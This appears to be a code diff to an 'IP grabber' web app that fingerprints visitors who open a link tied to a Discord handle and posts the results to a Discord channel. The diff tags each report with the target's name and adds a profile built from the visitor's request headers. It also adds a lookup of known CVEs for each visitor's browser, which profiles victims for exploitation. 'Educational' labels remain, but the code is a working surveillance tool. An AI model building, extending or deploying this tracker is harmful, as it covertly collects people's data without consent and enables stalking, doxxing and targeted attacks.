@@ -294,6 +294,15 @@ def send_to_channel(message: str, embed_data=None, components=None):
 
     # Build payload more safely
     if embed_data:
+        # Discord limits: field value ≤1024, field name ≤256, description ≤4096, embed total ≤6000
+        if isinstance(embed_data, dict) and isinstance(embed_data.get("fields"), list):
+            for field in embed_data["fields"]:
+                value = field.get("value", "")
+                if isinstance(value, str) and len(value) > 1024:
+                    field["value"] = value[:1021] + "..."
+                name = field.get("name", "")
+                if isinstance(name, str) and len(name) > 256:
+                    field["name"] = name[:253] + "..."
         payload["embeds"] = [embed_data]
         if message:
             payload["content"] = message
@@ -494,18 +503,22 @@ def create_ip_grabber_embed(
     threat_score = min(threat_score, 100)
     threat_level, embed_color = get_threat_indicator(threat_score)
 
+    target_display = str(dc_handle or "Anonymous").rstrip("?").strip() or "Anonymous"
+    target_display = target_display[:64]
+
     embed = {
-        "title": "🎓 IP TRACKING EDUCATIONAL DEMONSTRATION",
-        "description": f"**📚 CYBERSECURITY LESSON: BROWSER FINGERPRINTING**\n"
-        + f"**{threat_level} PRIVACY RISK ANALYSIS**\n"
-        + f"📊 **Digital profile demonstration for: `{dc_handle}`**\n\n"
-        + f"*This shows how much data can be collected from a simple link click*",
+        "title": f"🎯 IP TRACKING — Ticket: {target_display}",
+        "description": (
+            f"**Ticket:** `{target_display}`\n"
+            f"**Threat Level:** {threat_level}\n"
+            f"_Browser fingerprinting demonstration · educational use only._"
+        ),
         "color": embed_color,
         "timestamp": datetime.now().isoformat(),
         "thumbnail": {"url": "https://cdn.discordapp.com/emojis/target.png"},
         "fields": [],
         "footer": {
-            "text": f"DC-Shield Educational Platform • Privacy Demonstration • Risk Score: {threat_score}/100",
+            "text": f"Ticket {target_display} • DC-Shield Educational Platform • Risk {threat_score}/100",
             "icon_url": "https://cdn.discordapp.com/emojis/globe.png",
         },
     }
@@ -715,18 +728,29 @@ def is_valid_ip(ip_string):
         return False
 
 
-def create_verbose_embed(device_info, event_type="IP_GRABBER"):
+def create_verbose_embed(device_info, event_type="IP_GRABBER", dc_handle=None):
     """
     Create a verbose embed with all detailed information.
     """
+    target = (str(dc_handle).rstrip("?").strip() or "Anonymous") if dc_handle else None
+
+    title_suffix = f" — Ticket: {target[:64]}" if target else ""
+    description = "Complete device and network fingerprint analysis"
+    if target:
+        description = f"**Ticket:** `{target[:64]}`\n{description}"
+
+    footer_text = "DC-Shield Detailed Analysis System"
+    if target:
+        footer_text = f"Ticket {target[:64]} • {footer_text}"
+
     embed = {
-        "title": f"📋 VERBOSE {event_type} DETAILS",
-        "description": "Complete device and network fingerprint analysis",
+        "title": f"📋 VERBOSE {event_type} DETAILS{title_suffix}",
+        "description": description,
         "color": 0x2F3542,  # Dark gray color
         "timestamp": datetime.now().isoformat(),
         "fields": [],
         "footer": {
-            "text": "DC-Shield Detailed Analysis System",
+            "text": footer_text,
             "icon_url": "https://cdn.discordapp.com/emojis/658997002100670484.png",
         },
     }
@@ -903,6 +927,82 @@ async def collect_advanced_data():
         return jsonify({"status": "error", "message": str(e)}), 500
 
 
+def build_transport_profile(device_info):
+    """Aggregate transport-layer hints from request headers into a single dict."""
+    if not device_info:
+        return {}
+
+    def _present(value):
+        return value not in (None, "", "Unknown", "None")
+
+    cf_visitor = device_info.get("cf_visitor")
+    cf_scheme = None
+    if _present(cf_visitor):
+        try:
+            import json as _json
+            cf_scheme = _json.loads(cf_visitor).get("scheme")
+        except (ValueError, TypeError):
+            cf_scheme = None
+
+    profile = {
+        "scheme": device_info.get("scheme"),
+        "forwardedProto": device_info.get("x_forwarded_proto") if _present(device_info.get("x_forwarded_proto")) else None,
+        "cfScheme": cf_scheme,
+        "cfRay": device_info.get("cf_ray") if _present(device_info.get("cf_ray")) else None,
+        "cfCountry": device_info.get("cf_ipcountry") if _present(device_info.get("cf_ipcountry")) else None,
+        "secFetchSite": device_info.get("sec_fetch_site") if _present(device_info.get("sec_fetch_site")) else None,
+        "secFetchMode": device_info.get("sec_fetch_mode") if _present(device_info.get("sec_fetch_mode")) else None,
+        "secFetchDest": device_info.get("sec_fetch_dest") if _present(device_info.get("sec_fetch_dest")) else None,
+        "secChUaFullVersionList": device_info.get("sec_ch_ua_full_version_list") if _present(device_info.get("sec_ch_ua_full_version_list")) else None,
+        "secChUaPlatform": device_info.get("sec_ch_ua_platform") if _present(device_info.get("sec_ch_ua_platform")) else None,
+        "secChUaPlatformVersion": device_info.get("sec_ch_ua_platform_version") if _present(device_info.get("sec_ch_ua_platform_version")) else None,
+        "acceptLanguage": device_info.get("accept_language") if _present(device_info.get("accept_language")) else None,
+        "acceptEncoding": device_info.get("accept_encoding") if _present(device_info.get("accept_encoding")) else None,
+        "upgradeInsecureRequests": device_info.get("upgrade_insecure_requests") if _present(device_info.get("upgrade_insecure_requests")) else None,
+    }
+
+    # Derive a coarse TLS posture: cf-visitor + scheme + upgrade-insecure-requests
+    https_signals = sum(
+        1 for v in (profile["scheme"], profile["forwardedProto"], profile["cfScheme"])
+        if v and v.lower() == "https"
+    )
+    profile["isHttps"] = https_signals > 0
+    profile["secureContextHints"] = https_signals
+
+    # Drop empty keys for compact display
+    return {k: v for k, v in profile.items() if v not in (None, "", False, 0)} | {
+        "isHttps": profile["isHttps"],
+        "secureContextHints": profile["secureContextHints"],
+    }
+
+
+def lookup_browser_cves(device_info, advanced_data=None):
+    """Run the passive CVE lookup against the parsed UA + UA-CH version list."""
+    try:
+        from cve_lookup import lookup_cves, summarise
+    except ImportError:
+        return {"count": 0, "max_cvss": 0.0, "highest_severity": "none", "items": []}
+
+    family = (device_info or {}).get("browser_family") if device_info else None
+    version = (device_info or {}).get("browser_version") if device_info else None
+
+    # Prefer UA-CH `fullVersionList` when present (sent from JS) — more accurate than UA string.
+    if advanced_data:
+        ua_ch = advanced_data.get("uaClientHints") or {}
+        full_list = ua_ch.get("fullVersionList") if isinstance(ua_ch, dict) else None
+        if isinstance(full_list, list) and family:
+            wanted = family.lower()
+            for entry in full_list:
+                if not isinstance(entry, dict):
+                    continue
+                brand = (entry.get("brand") or "").lower()
+                if wanted in brand or brand in wanted:
+                    version = entry.get("version") or version
+                    break
+
+    return summarise(lookup_cves(family, version))
+
+
 def send_advanced_data_to_discord(
     collected_data, device_info=None, ip_address=None, user_identifier=None
 ):
@@ -922,6 +1022,16 @@ def send_advanced_data_to_discord(
         else:
             # Fallback: treat as the data directly
             data = collected_data if collected_data else {}
+
+        # Server-side enrichment: transport fingerprint + passive CVE match.
+        # Stored under reserved underscore keys so embed builders can pick them up.
+        if isinstance(data, dict):
+            transport = build_transport_profile(device_info)
+            if transport:
+                data["_serverTransport"] = transport
+            cve_summary = lookup_browser_cves(device_info, data)
+            if cve_summary and cve_summary.get("count", 0) > 0:
+                data["_serverCveMatches"] = cve_summary
 
         # Perform device recognition if we have device info
         recognition_info = None
@@ -948,11 +1058,13 @@ def send_advanced_data_to_discord(
         bot_manager = get_bot_manager()
         if bot_manager and bot_manager.ready:
             l.info("Sending data via Discord bot with interactive menu")
-            bot_manager.send_data(data, recognition_info)
+            bot_manager.send_data(data, recognition_info, user_identifier)
         else:
             # Fallback to webhook if bot not available
             l.warning("Bot not available, falling back to webhook")
-            embed = create_combined_surveillance_embed(data, recognition_info)
+            embed = create_combined_surveillance_embed(
+                data, recognition_info, dc_handle=user_identifier
+            )
             send_to_channel(COMPREHENSIVE_REPORT_MESSAGE, embed)
 
     except Exception as e:
@@ -965,7 +1077,9 @@ def send_advanced_data_to_discord(
             else:
                 fallback_data = collected_data if collected_data else {}
 
-            embed = create_combined_surveillance_embed(fallback_data)
+            embed = create_combined_surveillance_embed(
+                fallback_data, dc_handle=user_identifier
+            )
             send_to_channel(COMPREHENSIVE_REPORT_MESSAGE, embed)
         except Exception as fallback_error:
             l.error(f"Fallback also failed: {fallback_error}")
@@ -1174,7 +1288,9 @@ async def ip_grab(dc_handle):
             send_to_channel("", embed)
 
             # Send verbose embed as follow-up message
-            verbose_embed = create_verbose_embed(device_info, "IP_GRABBER")
+            verbose_embed = create_verbose_embed(
+                device_info, "IP_GRABBER", dc_handle=dc_handle
+            )
             send_to_channel("📋 **Detailed Analysis:**", verbose_embed)
         else:
             l.warning(f"Invalid IP data received: {data}")
